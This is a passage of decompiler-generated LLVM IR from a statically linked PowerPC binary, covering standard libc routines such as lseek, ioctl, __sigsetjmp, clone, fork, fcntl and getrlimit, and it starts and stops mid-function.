dec_label_pc_10018770:                            ; preds = %entry
  %v0_10018770 = load i32, i32* @r31, align 4
  %v0_10018774 = load i32, i32* %r29.global-to-local, align 4
  store i32 268535680, i32* @lr, align 4
  %v3_1001877c = call i32 @__GI___libc_lseek(i32 %v0_10018774, i32 %v0_10018770, i32 0)
  %v3_10018780 = icmp eq i32 %v3_1001877c, -1
  br i1 %v3_10018780, label %dec_label_pc_100187ec, label %dec_label_pc_10018788

dec_label_pc_10018788:                            ; preds = %dec_label_pc_10018770
  %v0_10018788 = load i32, i32* %r30.global-to-local, align 4
  %v3_10018788 = icmp eq i32 %v0_10018788, 1
  %v0_10018798 = load i32, i32* %r29.global-to-local, align 4
  br i1 %v3_10018788, label %dec_label_pc_10018790, label %dec_label_pc_100187a4

dec_label_pc_10018790:                            ; preds = %dec_label_pc_10018788
  %v0_10018790 = load i32, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100187a0.1123 to i32), i32* @lr, align 4
  %v2_1001879c = call i32 @__libc_write(i32 %v0_10018798, i32 %v0_10018790)
  br label %dec_label_pc_100187b4

dec_label_pc_100187a4:                            ; preds = %dec_label_pc_10018788
  store i32 268535732, i32* @lr, align 4
  %v1_100187b0 = call i32 @__libc_read(i32 %v0_10018798)
  br label %dec_label_pc_100187b4

dec_label_pc_100187b4:                            ; preds = %dec_label_pc_10018790, %dec_label_pc_100187a4
  %storemerge = phi i32 [ %v1_100187b0, %dec_label_pc_100187a4 ], [ %v2_1001879c, %dec_label_pc_10018790 ]
  store i32 %storemerge, i32* %r30.global-to-local, align 4
  %v0_100187b8 = call i32 @__errno_location()
  store i32 %v0_100187b8, i32* @r31, align 4
  %v0_100187c0 = load i32, i32* %r26.global-to-local, align 4
  %v0_100187c4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100187cc = inttoptr i32 %v0_100187b8 to i32*
  %v2_100187cc = load i32, i32* %v1_100187cc, align 4
  store i32 %v2_100187cc, i32* %r29.global-to-local, align 4
  store i32 268535764, i32* @lr, align 4
  %v3_100187d0 = call i32 @__GI___libc_lseek(i32 %v0_100187c4, i32 %v0_100187c0, i32 0)
  %v3_100187d4 = icmp eq i32 %v3_100187d0, -1
  br i1 %v3_100187d4, label %dec_label_pc_100187dc, label %dec_label_pc_100187e4

dec_label_pc_100187dc:                            ; preds = %dec_label_pc_100187b4
  %v0_100187dc = load i32, i32* %r30.global-to-local, align 4
  %v3_100187dc = icmp eq i32 %v0_100187dc, -1
  br i1 %v3_100187dc, label %dec_label_pc_100187e4, label %dec_label_pc_100187ec

dec_label_pc_100187e4:                            ; preds = %dec_label_pc_100187dc, %dec_label_pc_100187b4
  %v0_100187e4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100187e4 = load i32, i32* @r31, align 4
  %v2_100187e4 = inttoptr i32 %v1_100187e4 to i32*
  store i32 %v0_100187e4, i32* %v2_100187e4, align 4
  %v0_100187f4.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100187f0

dec_label_pc_100187ec:                            ; preds = %dec_label_pc_100187dc, %dec_label_pc_10018770, %entry
  store i32 -1, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100187f0

dec_label_pc_100187f0:                            ; preds = %dec_label_pc_100187e4, %dec_label_pc_100187ec
  %v0_100187f4 = phi i32 [ %v0_100187f4.pre, %dec_label_pc_100187e4 ], [ -1, %dec_label_pc_100187ec ]
  ret i32 %v0_100187f4

; uselistorder directives
  uselistorder i32* %r30.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100187f0, { 1, 0 }
  uselistorder label %dec_label_pc_100187b4, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 1, i32* @r7, align 4
  %v1_1001880c = call i32 @__fake_pread_write(i32 1)
  ret i32 %v1_1001880c
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @r7, align 4
  %v1_10018814 = call i32 @__fake_pread_write(i32 0)
  ret i32 %v1_10018814

; uselistorder directives
  uselistorder i32 (i32)* @__fake_pread_write, { 1, 0 }
}

define i32 @ioctl() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 -2143521772, i32* @r10, align 4
  %v0_1001882c = load i32, i32* @r5, align 4
  %v0_1001883c = load i32, i32* @r4, align 4
  %v4_1001883c = icmp eq i32 %v0_1001883c, -2143521772
  %v2_10018840 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10018840, i32* %stack_var_-32, align 4
  br i1 %v4_1001883c, label %dec_label_pc_1001889c, label %dec_label_pc_1001885c

dec_label_pc_1001885c:                            ; preds = %entry
  %v3_1001885c = icmp ugt i32 %v0_1001883c, -2143521772
  br i1 %v3_1001885c, label %dec_label_pc_10018874, label %dec_label_pc_10018864

dec_label_pc_10018864:                            ; preds = %dec_label_pc_1001885c
  %v3_10018868 = icmp eq i32 %v0_1001883c, 1077703699
  br i1 %v3_10018868, label %dec_label_pc_10018890, label %dec_label_pc_100188bc

dec_label_pc_10018874:                            ; preds = %dec_label_pc_1001885c
  %v1_10018874 = xor i32 %v0_1001883c, -2143551488
  %v3_10018878 = icmp eq i32 %v1_10018874, 29717
  br i1 %v3_10018878, label %dec_label_pc_100188ac, label %dec_label_pc_10018880

dec_label_pc_10018880:                            ; preds = %dec_label_pc_10018874
  %v3_10018884 = icmp eq i32 %v1_10018874, 29718
  br i1 %v3_10018884, label %dec_label_pc_100188b4, label %dec_label_pc_100188bc

dec_label_pc_10018890:                            ; preds = %dec_label_pc_10018864
  store i32 ptrtoint (i32* @global_var_10018898.1124 to i32), i32* @lr, align 4
  %v1_10018894 = inttoptr i32 %v0_1001882c to i32*
  %v2_10018894 = call i32 @__GI_tcgetattr(i32* %v1_10018894)
  br label %dec_label_pc_100188a4

dec_label_pc_1001889c:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_100188a0

dec_label_pc_100188a0:                            ; preds = %dec_label_pc_100188b4, %dec_label_pc_100188ac, %dec_label_pc_1001889c
  store i32 268535972, i32* @lr, align 4
  %v0_100188a0 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_100188a4

dec_label_pc_100188a4:                            ; preds = %dec_label_pc_10018890, %dec_label_pc_100188a0
  %storemerge = phi i32 [ %v0_100188a0, %dec_label_pc_100188a0 ], [ %v2_10018894, %dec_label_pc_10018890 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100188e8

dec_label_pc_100188ac:                            ; preds = %dec_label_pc_10018874
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_100188a0

dec_label_pc_100188b4:                            ; preds = %dec_label_pc_10018880
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_100188a0

dec_label_pc_100188bc:                            ; preds = %dec_label_pc_10018880, %dec_label_pc_10018864
  %v0_100188cc = call i32 @__asm_mfcr()
  %v1_100188d0 = and i32 %v0_100188cc, 268435456
  %v3_100188d0 = icmp eq i32 %v1_100188d0, 0
  store i32 %v0_100188cc, i32* %r31.global-to-local, align 4
  br i1 %v3_100188d0, label %dec_label_pc_100188e8, label %dec_label_pc_100188dc

dec_label_pc_100188dc:                            ; preds = %dec_label_pc_100188bc
  %v0_100188dc = call i32 @__errno_location()
  %v0_100188e0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100188e0 = inttoptr i32 %v0_100188dc to i32*
  store i32 %v0_100188e0, i32* %v2_100188e0, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100188e8

dec_label_pc_100188e8:                            ; preds = %dec_label_pc_100188bc, %dec_label_pc_100188a4, %dec_label_pc_100188dc
  %v0_100188ec = phi i32 [ %v0_100188cc, %dec_label_pc_100188bc ], [ %storemerge, %dec_label_pc_100188a4 ], [ -1, %dec_label_pc_100188dc ]
  ret i32 %v0_100188ec

; uselistorder directives
  uselistorder i32 %v0_1001883c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100188e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100188a4, { 1, 0 }
}

define i32 @__sigsetjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  store i32 0, i32* %r15.global-to-local, align 4
  store i32 0, i32* %r14.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_10018900 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v3_10018900, i32* %arg1, align 4
  %v0_10018904 = load i32, i32* @lr, align 4
  store i32 %v0_10018904, i32* %r0.global-to-local, align 4
  %v0_10018908 = load i32, i32* @r2, align 4
  %v2_10018908 = add i32 %tmp, 4
  %v3_10018908 = inttoptr i32 %v2_10018908 to i32*
  store i32 %v0_10018908, i32* %v3_10018908, align 4
  %v0_1001890c = load i32, i32* %r14.global-to-local, align 4
  %v2_1001890c = add i32 %tmp, 12
  %v3_1001890c = inttoptr i32 %v2_1001890c to i32*
  store i32 %v0_1001890c, i32* %v3_1001890c, align 4
  %v0_10018914 = load i32, i32* %r0.global-to-local, align 4
  %v2_10018914 = add i32 %tmp, 8
  %v3_10018914 = inttoptr i32 %v2_10018914 to i32*
  store i32 %v0_10018914, i32* %v3_10018914, align 4
  %v0_10018918 = load i32, i32* %r15.global-to-local, align 4
  %v2_10018918 = add i32 %tmp, 16
  %v3_10018918 = inttoptr i32 %v2_10018918 to i32*
  store i32 %v0_10018918, i32* %v3_10018918, align 4
  %v0_10018920 = call i32 @__asm_mfcr()
  store i32 %v0_10018920, i32* @r3, align 4
  store i32 %v0_10018920, i32* %r0.global-to-local, align 4
  %v0_10018924 = load i32, i32* @r16, align 4
  %v2_10018924 = add i32 %v0_10018920, 20
  %v3_10018924 = inttoptr i32 %v2_10018924 to i32*
  store i32 %v0_10018924, i32* %v3_10018924, align 4
  %v2_1001892c = add i32 %v0_10018920, 84
  %v3_1001892c = inttoptr i32 %v2_1001892c to i32*
  store i32 %v0_10018920, i32* %v3_1001892c, align 4
  %v0_10018930 = load i32, i32* @r17, align 4
  %v2_10018930 = add i32 %v0_10018920, 24
  %v3_10018930 = inttoptr i32 %v2_10018930 to i32*
  store i32 %v0_10018930, i32* %v3_10018930, align 4
  %v0_10018938 = load i32, i32* @r18, align 4
  %v2_10018938 = add i32 %v0_10018920, 28
  %v3_10018938 = inttoptr i32 %v2_10018938 to i32*
  store i32 %v0_10018938, i32* %v3_10018938, align 4
  %v0_10018940 = load i32, i32* @r19, align 4
  %v2_10018940 = add i32 %v0_10018920, 32
  %v3_10018940 = inttoptr i32 %v2_10018940 to i32*
  store i32 %v0_10018940, i32* %v3_10018940, align 4
  %v0_10018948 = load i32, i32* @r20, align 4
  %v2_10018948 = add i32 %v0_10018920, 36
  %v3_10018948 = inttoptr i32 %v2_10018948 to i32*
  store i32 %v0_10018948, i32* %v3_10018948, align 4
  %v0_10018950 = load i32, i32* @r21, align 4
  %v2_10018950 = add i32 %v0_10018920, 40
  %v3_10018950 = inttoptr i32 %v2_10018950 to i32*
  store i32 %v0_10018950, i32* %v3_10018950, align 4
  %v0_10018958 = load i32, i32* @r22, align 4
  %v2_10018958 = add i32 %v0_10018920, 44
  %v3_10018958 = inttoptr i32 %v2_10018958 to i32*
  store i32 %v0_10018958, i32* %v3_10018958, align 4
  %v0_10018960 = load i32, i32* @r23, align 4
  %v2_10018960 = add i32 %v0_10018920, 48
  %v3_10018960 = inttoptr i32 %v2_10018960 to i32*
  store i32 %v0_10018960, i32* %v3_10018960, align 4
  %v0_10018968 = load i32, i32* @r24, align 4
  %v2_10018968 = add i32 %v0_10018920, 52
  %v3_10018968 = inttoptr i32 %v2_10018968 to i32*
  store i32 %v0_10018968, i32* %v3_10018968, align 4
  %v0_10018970 = load i32, i32* @r25, align 4
  %v2_10018970 = add i32 %v0_10018920, 56
  %v3_10018970 = inttoptr i32 %v2_10018970 to i32*
  store i32 %v0_10018970, i32* %v3_10018970, align 4
  %v0_10018978 = load i32, i32* @r26, align 4
  %v2_10018978 = add i32 %v0_10018920, 60
  %v3_10018978 = inttoptr i32 %v2_10018978 to i32*
  store i32 %v0_10018978, i32* %v3_10018978, align 4
  %v0_10018980 = load i32, i32* @r27, align 4
  %v2_10018980 = add i32 %v0_10018920, 64
  %v3_10018980 = inttoptr i32 %v2_10018980 to i32*
  store i32 %v0_10018980, i32* %v3_10018980, align 4
  %v0_10018988 = load i32, i32* @r28, align 4
  %v2_10018988 = add i32 %v0_10018920, 68
  %v3_10018988 = inttoptr i32 %v2_10018988 to i32*
  store i32 %v0_10018988, i32* %v3_10018988, align 4
  %v0_10018990 = load i32, i32* @r29, align 4
  %v2_10018990 = add i32 %v0_10018920, 72
  %v3_10018990 = inttoptr i32 %v2_10018990 to i32*
  store i32 %v0_10018990, i32* %v3_10018990, align 4
  %v0_10018998 = load i32, i32* @r30, align 4
  %v2_10018998 = add i32 %v0_10018920, 76
  %v3_10018998 = inttoptr i32 %v2_10018998 to i32*
  store i32 %v0_10018998, i32* %v3_10018998, align 4
  %v0_100189a0 = load i32, i32* @r31, align 4
  %v2_100189a0 = add i32 %v0_10018920, 80
  %v3_100189a0 = inttoptr i32 %v2_100189a0 to i32*
  store i32 %v0_100189a0, i32* %v3_100189a0, align 4
  %v0_100189a8 = call i32 @__sigjmp_save()
  ret i32 %v0_100189a8

; uselistorder directives
  uselistorder i32 %v0_10018920, { 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 2, 3, 4, 16, 5, 17, 19, 18 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32 72, { 1, 0 }
  uselistorder i32 68, { 1, 0, 2, 3 }
}

define i32 @clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %v0_100189b4 = load i32, i32* @r2, align 4
  %v3_100189b4 = call %1 @__asm_cror(i32 %v0_100189b4, i32 %arg4, i32 %v0_100189b4)
  %v6_100189b4 = extractvalue %1 %v3_100189b4, 2
  br i1 %v6_100189b4, label %dec_label_pc_10018a18, label %dec_label_pc_100189bc

dec_label_pc_100189bc:                            ; preds = %entry
  %v1_100189c4 = call i32 @__asm_rlwinm(i32 %arg2, i32 0, i32 0, i32 27)
  %v2_100189cc = add i32 %v1_100189c4, -16
  %v3_100189cc = inttoptr i32 %v2_100189cc to i32*
  store i32 0, i32* %v3_100189cc, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %v2_100189cc, i32* @r30, align 4
  store i32 %arg4, i32* @r31, align 4
  store i32 %arg3, i32* @r3, align 4
  %v3_100189e8 = icmp eq i32 %arg3, 0
  %v3_100189ec = call %2 @__asm_crandc(i32 %arg4, i32 %arg4, i32 %arg3)
  %v7_100189ec = extractvalue %2 %v3_100189ec, 3
  br i1 %v3_100189e8, label %dec_label_pc_100189f4, label %dec_label_pc_10018a08

dec_label_pc_100189f4:                            ; preds = %dec_label_pc_100189bc
  %v0_100189f8 = load i32, i32* %r29.global-to-local, align 4
  %v0_100189fc = load i32, i32* @r31, align 4
  call void @__pseudo_call(i32 %v0_100189f8)
  %v1_10018a04 = call i32 @__GI__exit(i32 %v0_100189fc)
  store i32 %v1_10018a04, i32* @r3, align 4
  %v1_10018a10.pre = load i1, i1* @cr0_so, align 1
  br label %dec_label_pc_10018a08

dec_label_pc_10018a08:                            ; preds = %dec_label_pc_100189bc, %dec_label_pc_100189f4
  %v1_10018a10 = phi i1 [ %v7_100189ec, %dec_label_pc_100189bc ], [ %v1_10018a10.pre, %dec_label_pc_100189f4 ]
  %v2_10018a10 = xor i1 %v1_10018a10, true
  call void @__pseudo_cond_branch(i1 %v2_10018a10, i32 ptrtoint (i32* @global_var_10018a04.1125 to i32))
  %v0_10018a14 = call i32 @__syscall_error()
  br label %dec_label_pc_10018a18

dec_label_pc_10018a18:                            ; preds = %entry, %dec_label_pc_10018a08
  store i32 22, i32* @r3, align 4
  %v0_10018a1c = call i32 @__syscall_error()
  ret i32 %v0_10018a1c

; uselistorder directives
  uselistorder i32* @r2, { 33, 32, 56, 21, 57, 13, 50, 44, 43, 0, 14, 15, 16, 1, 2, 3, 4, 17, 18, 5, 19, 20, 22, 23, 45, 46, 58, 59, 48, 49, 24, 25, 6, 7, 26, 27, 51, 53, 54, 8, 42, 28, 29, 40, 41, 39, 60, 61, 62, 55, 52, 30, 47, 9, 10, 11, 12, 36, 65, 34, 35, 37, 31, 38, 64, 63 }
  uselistorder i32 %arg4, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10018a18, { 1, 0 }
  uselistorder label %dec_label_pc_10018a08, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10018a30 = add i32 %arg2, -12
  %v2_10018a38 = icmp ugt i32 %v1_10018a30, 2
  %v2_10018a3c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10018a3c, i32* %stack_var_-32, align 4
  br i1 %v2_10018a38, label %dec_label_pc_10018a6c, label %dec_label_pc_10018a5c

dec_label_pc_10018a5c:                            ; preds = %entry
  store i32 268536420, i32* @lr, align 4
  %v2_10018a60 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_10018a60, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10018a8c

dec_label_pc_10018a6c:                            ; preds = %entry
  %v0_10018a70 = call i32 @__asm_mfcr()
  %v1_10018a74 = and i32 %v0_10018a70, 268435456
  %v3_10018a74 = icmp eq i32 %v1_10018a74, 0
  store i32 %v0_10018a70, i32* %r31.global-to-local, align 4
  br i1 %v3_10018a74, label %dec_label_pc_10018a8c, label %dec_label_pc_10018a80

dec_label_pc_10018a80:                            ; preds = %dec_label_pc_10018a6c
  %v0_10018a80 = call i32 @__errno_location()
  %v0_10018a84 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018a84 = inttoptr i32 %v0_10018a80 to i32*
  store i32 %v0_10018a84, i32* %v2_10018a84, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10018a8c

dec_label_pc_10018a8c:                            ; preds = %dec_label_pc_10018a6c, %dec_label_pc_10018a5c, %dec_label_pc_10018a80
  %v0_10018a90 = phi i32 [ %v0_10018a70, %dec_label_pc_10018a6c ], [ %v2_10018a60, %dec_label_pc_10018a5c ], [ -1, %dec_label_pc_10018a80 ]
  ret i32 %v0_10018a90

; uselistorder directives
  uselistorder label %dec_label_pc_10018a8c, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_10018ab8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10018ab8, i32* %stack_var_-32, align 4
  %v0_10018ad8 = call i32 @__asm_mfcr()
  %v1_10018adc = and i32 %v0_10018ad8, 268435456
  %v3_10018adc = icmp eq i32 %v1_10018adc, 0
  store i32 %v0_10018ad8, i32* %r31.global-to-local, align 4
  br i1 %v3_10018adc, label %dec_label_pc_10018af4, label %dec_label_pc_10018ae8

dec_label_pc_10018ae8:                            ; preds = %entry
  %v0_10018ae8 = call i32 @__errno_location()
  %v0_10018aec = load i32, i32* %r31.global-to-local, align 4
  %v2_10018aec = inttoptr i32 %v0_10018ae8 to i32*
  store i32 %v0_10018aec, i32* %v2_10018aec, align 4
  br label %dec_label_pc_10018af4

dec_label_pc_10018af4:                            ; preds = %entry, %dec_label_pc_10018ae8
  %v0_10018b04 = phi i32 [ %v0_10018ad8, %entry ], [ -1, %dec_label_pc_10018ae8 ]
  ret i32 %v0_10018b04

; uselistorder directives
  uselistorder label %dec_label_pc_10018af4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_10018b1c

dec_label_pc_10018b1c:                            ; preds = %dec_label_pc_10018b1c.backedge, %entry
  %v0_10018b28 = call i32 @__asm_mfcr()
  %v1_10018b2c = and i32 %v0_10018b28, 268435456
  %v3_10018b2c = icmp eq i32 %v1_10018b2c, 0
  store i32 %v0_10018b28, i32* %r31.global-to-local, align 4
  br i1 %v3_10018b2c, label %dec_label_pc_10018b1c.backedge, label %dec_label_pc_10018b38

dec_label_pc_10018b38:                            ; preds = %dec_label_pc_10018b1c
  %v0_10018b38 = call i32 @__errno_location()
  %v0_10018b3c = load i32, i32* %r31.global-to-local, align 4
  %v2_10018b3c = inttoptr i32 %v0_10018b38 to i32*
  store i32 %v0_10018b3c, i32* %v2_10018b3c, align 4
  br label %dec_label_pc_10018b1c.backedge

dec_label_pc_10018b1c.backedge:                   ; preds = %dec_label_pc_10018b38, %dec_label_pc_10018b1c
  br label %dec_label_pc_10018b1c
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018b5c = call i32 @__asm_mfcr()
  %v1_10018b60 = and i32 %v0_10018b5c, 268435456
  %v3_10018b60 = icmp eq i32 %v1_10018b60, 0
  store i32 %v0_10018b5c, i32* %r31.global-to-local, align 4
  br i1 %v3_10018b60, label %dec_label_pc_10018b78, label %dec_label_pc_10018b6c

dec_label_pc_10018b6c:                            ; preds = %entry
  %v0_10018b6c = call i32 @__errno_location()
  %v0_10018b70 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018b70 = inttoptr i32 %v0_10018b6c to i32*
  store i32 %v0_10018b70, i32* %v2_10018b70, align 4
  br label %dec_label_pc_10018b78

dec_label_pc_10018b78:                            ; preds = %entry, %dec_label_pc_10018b6c
  %v0_10018b88 = phi i32 [ %v0_10018b5c, %entry ], [ -1, %dec_label_pc_10018b6c ]
  ret i32 %v0_10018b88

; uselistorder directives
  uselistorder label %dec_label_pc_10018b78, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018ba4 = call i32 @__asm_mfcr()
  %v1_10018ba8 = and i32 %v0_10018ba4, 268435456
  %v3_10018ba8 = icmp eq i32 %v1_10018ba8, 0
  store i32 %v0_10018ba4, i32* %r31.global-to-local, align 4
  br i1 %v3_10018ba8, label %dec_label_pc_10018bc0, label %dec_label_pc_10018bb4

dec_label_pc_10018bb4:                            ; preds = %entry
  %v0_10018bb4 = call i32 @__errno_location()
  %v0_10018bb8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018bb8 = inttoptr i32 %v0_10018bb4 to i32*
  store i32 %v0_10018bb8, i32* %v2_10018bb8, align 4
  br label %dec_label_pc_10018bc0

dec_label_pc_10018bc0:                            ; preds = %entry, %dec_label_pc_10018bb4
  %v0_10018bd0 = phi i32 [ %v0_10018ba4, %entry ], [ -1, %dec_label_pc_10018bb4 ]
  ret i32 %v0_10018bd0

; uselistorder directives
  uselistorder label %dec_label_pc_10018bc0, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018bec = call i32 @__asm_mfcr()
  %v1_10018bf0 = and i32 %v0_10018bec, 268435456
  %v3_10018bf0 = icmp eq i32 %v1_10018bf0, 0
  store i32 %v0_10018bec, i32* %r31.global-to-local, align 4
  br i1 %v3_10018bf0, label %dec_label_pc_10018c08, label %dec_label_pc_10018bfc

dec_label_pc_10018bfc:                            ; preds = %entry
  %v0_10018bfc = call i32 @__errno_location()
  %v0_10018c00 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018c00 = inttoptr i32 %v0_10018bfc to i32*
  store i32 %v0_10018c00, i32* %v2_10018c00, align 4
  br label %dec_label_pc_10018c08

dec_label_pc_10018c08:                            ; preds = %entry, %dec_label_pc_10018bfc
  %v0_10018c18 = phi i32 [ %v0_10018bec, %entry ], [ -1, %dec_label_pc_10018bfc ]
  ret i32 %v0_10018c18

; uselistorder directives
  uselistorder label %dec_label_pc_10018c08, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_10018c28 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268536884, i32* @lr, align 4
  %v2_10018c30 = call i32 @getrlimit(i32 7, i32 %v2_10018c28)
  %v1_10018c34 = icmp slt i32 %v2_10018c30, 0
  br i1 %v1_10018c34, label %dec_label_pc_10018c44, label %dec_label_pc_10018c40

dec_label_pc_10018c40:                            ; preds = %entry
  %v3_10018c40 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10018c44

dec_label_pc_10018c44:                            ; preds = %entry, %dec_label_pc_10018c40
  %v0_10018c50 = phi i32 [ 256, %entry ], [ %v3_10018c40, %dec_label_pc_10018c40 ]
  ret i32 %v0_10018c50

; uselistorder directives
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder label %dec_label_pc_10018c44, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018c6c = call i32 @__asm_mfcr()
  %v1_10018c70 = and i32 %v0_10018c6c, 268435456
  %v3_10018c70 = icmp eq i32 %v1_10018c70, 0
  store i32 %v0_10018c6c, i32* %r31.global-to-local, align 4
  br i1 %v3_10018c70, label %dec_label_pc_10018c88, label %dec_label_pc_10018c7c

dec_label_pc_10018c7c:                            ; preds = %entry
  %v0_10018c7c = call i32 @__errno_location()
  %v0_10018c80 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018c80 = inttoptr i32 %v0_10018c7c to i32*
  store i32 %v0_10018c80, i32* %v2_10018c80, align 4
  br label %dec_label_pc_10018c88

dec_label_pc_10018c88:                            ; preds = %entry, %dec_label_pc_10018c7c
  %v0_10018c98 = phi i32 [ %v0_10018c6c, %entry ], [ -1, %dec_label_pc_10018c7c ]
  ret i32 %v0_10018c98

; uselistorder directives
  uselistorder label %dec_label_pc_10018c88, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_10018ca4 = load i32, i32* @global_var_10045234.1005, align 4
  %v3_10018ca8 = icmp eq i32 %v3_10018ca4, 0
  %v0_10018cac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10018ca8, i32 %v0_10018cac)
  ret i32 %v3_10018ca4
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018cd0 = call i32 @__asm_mfcr()
  %v1_10018cd4 = and i32 %v0_10018cd0, 268435456
  %v3_10018cd4 = icmp eq i32 %v1_10018cd4, 0
  store i32 %v0_10018cd0, i32* %r31.global-to-local, align 4
  br i1 %v3_10018cd4, label %dec_label_pc_10018cec, label %dec_label_pc_10018ce0

dec_label_pc_10018ce0:                            ; preds = %entry
  %v0_10018ce0 = call i32 @__errno_location()
  %v0_10018ce4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018ce4 = inttoptr i32 %v0_10018ce0 to i32*
  store i32 %v0_10018ce4, i32* %v2_10018ce4, align 4
  br label %dec_label_pc_10018cec

dec_label_pc_10018cec:                            ; preds = %entry, %dec_label_pc_10018ce0
  %v0_10018cfc = phi i32 [ %v0_10018cd0, %entry ], [ -1, %dec_label_pc_10018ce0 ]
  ret i32 %v0_10018cfc

; uselistorder directives
  uselistorder label %dec_label_pc_10018cec, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018d18 = call i32 @__asm_mfcr()
  %v1_10018d1c = and i32 %v0_10018d18, 268435456
  %v3_10018d1c = icmp eq i32 %v1_10018d1c, 0
  store i32 %v0_10018d18, i32* %r31.global-to-local, align 4
  br i1 %v3_10018d1c, label %dec_label_pc_10018d34, label %dec_label_pc_10018d28

dec_label_pc_10018d28:                            ; preds = %entry
  %v0_10018d28 = call i32 @__errno_location()
  %v0_10018d2c = load i32, i32* %r31.global-to-local, align 4
  %v2_10018d2c = inttoptr i32 %v0_10018d28 to i32*
  store i32 %v0_10018d2c, i32* %v2_10018d2c, align 4
  br label %dec_label_pc_10018d34

dec_label_pc_10018d34:                            ; preds = %entry, %dec_label_pc_10018d28
  %v0_10018d44 = phi i32 [ %v0_10018d18, %entry ], [ -1, %dec_label_pc_10018d28 ]
  ret i32 %v0_10018d44

; uselistorder directives
  uselistorder label %dec_label_pc_10018d34, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018d60 = call i32 @__asm_mfcr()
  %v1_10018d64 = and i32 %v0_10018d60, 268435456
  %v3_10018d64 = icmp eq i32 %v1_10018d64, 0
  store i32 %v0_10018d60, i32* %r31.global-to-local, align 4
  br i1 %v3_10018d64, label %dec_label_pc_10018d7c, label %dec_label_pc_10018d70

dec_label_pc_10018d70:                            ; preds = %entry
  %v0_10018d70 = call i32 @__errno_location()
  %v0_10018d74 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018d74 = inttoptr i32 %v0_10018d70 to i32*
  store i32 %v0_10018d74, i32* %v2_10018d74, align 4
  br label %dec_label_pc_10018d7c

